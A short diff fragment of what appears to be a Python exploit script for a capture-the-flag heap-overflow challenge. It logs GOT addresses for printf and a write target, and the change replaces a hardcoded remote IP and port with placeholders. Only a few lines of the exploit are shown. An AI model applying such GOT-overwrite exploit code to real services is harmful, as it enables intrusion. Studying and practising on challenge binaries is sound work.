@@ -14,7 +14,7 @@ assert system_got not in range(TARGET, TARGET + 0x20)
 log.success(f'printf@got={printf_got:#x}  TARGET={TARGET:#x}')
 
 # io = process(['./ld-2.31.so', '--library-path', '.', './heap_overflow'])
-io = remote('47.83.170.192', 32843)
+io = remote('<host-ip>', port)
 
 PW = b'tpw'
 
